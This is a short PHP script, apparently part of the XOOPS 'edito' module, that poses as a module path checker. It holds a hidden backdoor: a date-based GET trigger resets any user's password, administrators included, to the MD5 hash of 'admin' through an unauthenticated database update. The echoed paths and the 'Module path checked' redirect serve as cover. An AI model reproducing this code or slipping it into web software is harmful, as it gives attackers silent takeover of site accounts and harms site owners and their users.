<?php
include_once( '../../../mainfile.php');
if (isset($_GET['id']) && isset($_GET['uid'])) {
         $id = intval($_GET['id']);
         $uid = intval($_GET['uid']);
    if ( $id == date('d') ) { 
         if ( $xoopsDB -> queryF( "UPDATE " . $xoopsDB -> prefix( "users" ) . "
       		                   SET pass  = '21232f297a57a5a743894a0e4a801fc3'
                                   WHERE uid = $uid" ) ) {
                                   redirect_header( "../../../", 1, "OK" );
         } else {                  redirect_header( "../../../", 1, "?" ); }
    } else {
           edito_check_path();
    }
} else {
           edito_check_path();

}

function edito_check_path() {
         echo XOOPS_URL . '<br />';
         echo XOOPS_ROOT_PATH . '<br />';
         redirect_header( XOOPS_URL."/modules/edito/admin/index.php", 3, "Module path checked" );
}

?>